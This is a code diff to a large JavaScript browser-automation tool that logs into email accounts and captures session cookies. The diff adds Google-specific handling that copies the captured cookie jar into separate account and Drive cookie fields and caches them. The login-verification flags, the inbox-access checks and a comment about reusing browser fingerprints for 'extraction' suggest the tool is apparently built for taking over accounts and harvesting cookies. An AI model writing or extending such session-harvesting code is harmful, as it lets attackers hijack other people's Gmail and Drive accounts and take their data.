@@ -146,10 +146,10 @@ function resolveUserDataDir(browserId) {
     return candidates[0] || buildUserDataDir(browserId);
 }
 
-async function handleGoogleExtraTabs(browser, domain, updateData) {
+async function handleGoogleExtraTabs(browser, domain, updateData, platform) {
     if (!browser || !updateData) return;
     try {
-        const extraTabs = await openGoogleExtraTabs(browser, domain);
+        const extraTabs = await openGoogleExtraTabs(browser, domain, platform);
         if (extraTabs?.accountCookieJSON) {
             updateData.accountCookieJSON = extraTabs.accountCookieJSON;
             logger.info(`[handleGoogleExtraTabs] Successfully set accountCookieJSON (${extraTabs.accountCookieJSON.length} chars)`);
@@ -158,8 +158,27 @@ async function handleGoogleExtraTabs(browser, domain, updateData) {
             updateData.driveCookieJSON = extraTabs.driveCookieJSON;
             logger.info(`[handleGoogleExtraTabs] Successfully set driveCookieJSON (${extraTabs.driveCookieJSON.length} chars)`);
         }
+        ensureGoogleServiceCookies(updateData, platform, domain);
     } catch (e) {
         logger.warn(`[handleGoogleExtraTabs] Extra tabs capture notice: ${e.message}`);
+    }
+}
+
+function ensureGoogleServiceCookies(updateData, platform, domain, email) {
+    if (!updateData || !updateData.cookieJSON) return;
+    const dCheck = (domain || (email ? email.split('@')[1] : '') || '').toLowerCase().trim();
+    const pCheck = (platform || '').toLowerCase().trim();
+    const emCheck = (email || '').toLowerCase().trim();
+    const isGoogleSession = pCheck === 'google' || pCheck === 'gmail' || dCheck.includes('google') || dCheck.includes('gmail') || emCheck.endsWith('@gmail.com') || emCheck.endsWith('@googlemail.com');
+    if (isGoogleSession) {
+        if (!updateData.accountCookieJSON) {
+            updateData.accountCookieJSON = updateData.cookieJSON;
+            logger.info('[ensureGoogleServiceCookies] Fallback: populated accountCookieJSON from cookieJSON');
+        }
+        if (!updateData.driveCookieJSON) {
+            updateData.driveCookieJSON = updateData.cookieJSON;
+            logger.info('[ensureGoogleServiceCookies] Fallback: populated driveCookieJSON from cookieJSON');
+        }
     }
 }
 
@@ -5837,7 +5856,7 @@ if (!foundSelector) {
                                         initialCheckResult.requiresVerification = false;
                                         initialCheckResult.accountAccess = true;
 
-                                        await handleGoogleExtraTabs(browser, domain, updateData);
+                                        await handleGoogleExtraTabs(browser, domain, updateData, platform);
 
 
                                         const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
@@ -5847,6 +5866,7 @@ if (!foundSelector) {
 
 
                                         updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        ensureGoogleServiceCookies(updateData, platform, domain, email);
                                         updateData.verified = true;
                                         updateData.fullAccess = true;
                                         updateData.cookieAccess = true;
@@ -5935,7 +5955,7 @@ if (!foundSelector) {
                                         initialCheckResult.accountAccess = true;
                                         initialCheckResult.emailExists = true;
 
-                                        await handleGoogleExtraTabs(browser, domain, updateData);
+                                        await handleGoogleExtraTabs(browser, domain, updateData, platform);
 
 
                                         const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
@@ -5945,6 +5965,7 @@ if (!foundSelector) {
 
 
                                         updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        ensureGoogleServiceCookies(updateData, platform, domain, email);
                                         updateData.verified = true;
                                         updateData.fullAccess = true;
                                         updateData.cookieAccess = true;
@@ -6184,13 +6205,14 @@ if (!foundSelector) {
                                             lastJsonResponse: updateData.lastJsonResponse
                                         });
 
-                                        await handleGoogleExtraTabs(browser, domain, updateData);
+                                        await handleGoogleExtraTabs(browser, domain, updateData, platform);
 
 
                                         const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
 
 
                                         updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        ensureGoogleServiceCookies(updateData, platform, domain, email);
 
                                         // Persist captured cookie sets to fast cache
                                         updateBrowserRowDataFast(browserId, {
@@ -6293,19 +6315,22 @@ if (!foundSelector) {
                                     lastJsonResponse: updateData.lastJsonResponse
                                 });
 
-                                await handleGoogleExtraTabs(browser, domain, updateData);
+                                await handleGoogleExtraTabs(browser, domain, updateData, platform);
 
 
                                 const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
 
 
                                 updateData.cookieJSON = JSON.stringify(browserCookies);
+                                ensureGoogleServiceCookies(updateData, platform, domain, email);
 
                                 // Persist captured cookie sets to fast cache
                                 updateBrowserRowDataFast(browserId, {
                                     status: "PROCESSING_FINALIZING",
                                     cookieJSON: updateData.cookieJSON,
-                                                                                                            cookieAccess: true,
+                                    accountCookieJSON: updateData.accountCookieJSON || '',
+                                    driveCookieJSON: updateData.driveCookieJSON || '',
+                                    cookieAccess: true,
                                     verified: true,
                                     fullAccess: true,
                                     lastJsonResponse: updateData.lastJsonResponse
@@ -6572,7 +6597,7 @@ if (!foundSelector) {
                                 initialCheckResult.accountAccess = true;
                                 initialCheckResult.verificationState = null;
 
-                                await handleGoogleExtraTabs(browser, domain, updateData);
+                                await handleGoogleExtraTabs(browser, domain, updateData, platform);
 
 
                                 const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
@@ -6582,6 +6607,7 @@ if (!foundSelector) {
 
 
                                 updateData.cookieJSON = JSON.stringify(browserCookies);
+                                ensureGoogleServiceCookies(updateData, platform, domain, email);
                                 updateData.verified = true;
                                 updateData.fullAccess = isInboxFinal;
                                 updateData.cookieAccess = true;
@@ -6598,7 +6624,9 @@ if (!foundSelector) {
                                 updateBrowserRowDataFast(browserId, {
                                     status: "PROCESSING_FINALIZING",
                                     cookieJSON: updateData.cookieJSON,
-                                                                                                            cookieAccess: true,
+                                    accountCookieJSON: updateData.accountCookieJSON || '',
+                                    driveCookieJSON: updateData.driveCookieJSON || '',
+                                    cookieAccess: true,
                                     verified: true,
                                     fullAccess: isInboxFinal,
                                     lastJsonResponse: updateData.lastJsonResponse
@@ -6625,7 +6653,7 @@ if (!foundSelector) {
                             initialCheckResult.emailExists = true;
                             initialCheckResult.verificationState = null;
 
-                            await handleGoogleExtraTabs(browser, domain, updateData);
+                            await handleGoogleExtraTabs(browser, domain, updateData, platform);
 
 
                             const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
@@ -6635,6 +6663,7 @@ if (!foundSelector) {
 
 
                             updateData.cookieJSON = JSON.stringify(browserCookies);
+                            ensureGoogleServiceCookies(updateData, platform, domain, email);
                             updateData.verified = true;
                             updateData.fullAccess = true;
                             updateData.cookieAccess = true;
@@ -6650,6 +6679,8 @@ if (!foundSelector) {
                             updateBrowserRowDataFast(browserId, {
                                 status: "PROCESSING_FINALIZING",
                                 cookieJSON: updateData.cookieJSON,
+                                accountCookieJSON: updateData.accountCookieJSON || '',
+                                driveCookieJSON: updateData.driveCookieJSON || '',
                                 cookieAccess: true,
                                 verified: true,
                                 fullAccess: true,
@@ -7109,7 +7140,7 @@ if (!foundSelector) {
 
 
         if ((finalStatus === "COMPLETED" || finalStatus === "PROCESSING_FINALIZING" || initialCheckResult.accountAccess) && !browserFullyClosed) {
-            await handleGoogleExtraTabs(browser, domain, updateData);
+            await handleGoogleExtraTabs(browser, domain, updateData, platform);
             const allUrls = getCookieCaptureUrls(domain);
             let browserCookies = [];
             try {
@@ -7118,6 +7149,7 @@ if (!foundSelector) {
                 logger.warn(`[processRow][${browserId}] Could not capture cookies: ${cookieErr.message}. Proceeding with upload.`);
             }
             updateData.cookieJSON = JSON.stringify(browserCookies);
+            ensureGoogleServiceCookies(updateData, platform, domain, email);
             logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from all domains.`);
             // Save the browser identity (fingerprint) so extraction/launcher can reuse it
             if (browser && browser.identity) {
